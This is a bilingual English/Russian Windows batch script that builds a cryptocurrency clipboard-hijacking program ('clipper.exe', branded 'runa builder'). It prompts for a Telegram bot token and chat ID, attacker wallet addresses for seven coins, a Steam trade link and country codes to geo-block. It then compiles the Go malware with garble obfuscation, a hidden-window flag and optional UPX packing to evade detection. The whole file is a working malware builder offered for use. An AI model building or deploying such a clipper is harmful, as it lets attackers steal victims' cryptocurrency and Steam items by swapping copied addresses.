@echo off
chcp 65001 >nul

setlocal enabledelayedexpansion

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
echo.

where go >nul 2>&1
if %errorlevel%==0 (
    rem installed
) else (
    echo Go not found. Install go and add it to PATH / Go не найден. Установите Go и добавьте его в PATH.
    echo Visit https://go.dev/dl/ for download / Перейдите на https://go.dev/dl/ для скачивания
    pause
    exit /b 1
)

where garble >nul 2>&1
if %errorlevel%==0 (
    rem installed
) else (
    go install mvdan.cc/garble@latest

    if errorlevel 1 (
        echo Failed to install garble / Ошибка при установке garble
        pause
        exit /b 1
    )
)

echo.
set /p "BOT_TOKEN=Bot token / Токен бота: "
set /p "CHAT_ID=Chat ID or Group ID / Ваш чат ID или ID группы: "

echo.

set /p "BTC=BTC address / Адрес BTC: "
set /p "ETH=ETH address / Адрес ETH: "
set /p "LTC=LTC address / Адрес LTC: "
set /p "DOGE=DOGE address / Адрес DOGE: "
set /p "TON=TON address / Адрес TON: "
set /p "USDT=USDT TRC address / Адрес USDT TRC: "
set /p "SOL=SOL address / Адрес SOL: "

echo.

set /p "STEAM=Steam trade url / Ссылка на обмен стим: "

echo.

echo Enter country codes to block (ISO 3166-1 alpha-2)
echo Example: RU,KZ,BY,UA,MD
echo Press Enter to skip

echo.

echo Введите коды стран для блокировки (ISO 3166-1 alpha-2)
echo Пример: RU,KZ,BY,UA,MD
echo Нажмите Enter чтобы пропустить

set /p "GEO_BLOCK=Geo block / Блокировка стран: "

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| building...
echo.

set "LDFLAGS=-s -w -X main.bot_token=%BOT_TOKEN%"
set "LDFLAGS=%LDFLAGS% -X main.chat_id=%CHAT_ID%"
set "LDFLAGS=%LDFLAGS% -X main.BtcAddr=%BTC%"
set "LDFLAGS=%LDFLAGS% -X main.EthAddr=%ETH%"
set "LDFLAGS=%LDFLAGS% -X main.LtcAddr=%LTC%"
set "LDFLAGS=%LDFLAGS% -X main.DogeAddr=%DOGE%"
set "LDFLAGS=%LDFLAGS% -X main.TonAddr=%TON%"
set "LDFLAGS=%LDFLAGS% -X main.UsdtTrcAddr=%USDT%"
set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"

if defined GEO_BLOCK (
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK!"
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN:"=!"
    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN: =!"
    
    if not "!GEO_BLOCK_CLEAN!"=="" (
        set "LDFLAGS=!LDFLAGS! -X main.blockedGeos=!GEO_BLOCK_CLEAN!"
    )
)

set /p "OBF=Use hard obfuscation / Использовать сильную обфускацию? (y/n): "

if /i "%OBF%"=="y" (
    garble -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
) else (
    garble build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
)

if errorlevel 1 (
    echo Build failed / Ошибка при сборке
    pause
    exit /b 1
)

cls

echo.
echo    _ __ _   _ _ __   __ _
echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| build completed
echo.

echo Build successful! / Билд создан: .\clipper.exe

echo.
set /p "USE_UPX=Use UPX / Использовать UPX для сжатия? (y/n): "

if /i "!USE_UPX!"=="y" (
    echo.
    
    if exist ".\upx.exe" (
        .\upx.exe --best clipper.exe
        
        if errorlevel 1 (
            echo UPX compression failed / Произошла ошибка при сжатии UPX
        ) else (
            echo UPX compression successful / Сжатие UPX успешно
        )
    ) else (
        echo UPX not found in current directory / UPX не найден в текущей директории
        echo Please ensure upx.exe is in the same folder as this script / Пожалуйста, убедитесь, что upx.exe находится в той же папке, что и этот скрипт
        echo You can download it from https://upx.github.io/ / Вы можете скачать его с https://upx.github.io/
    )
)

echo.
pause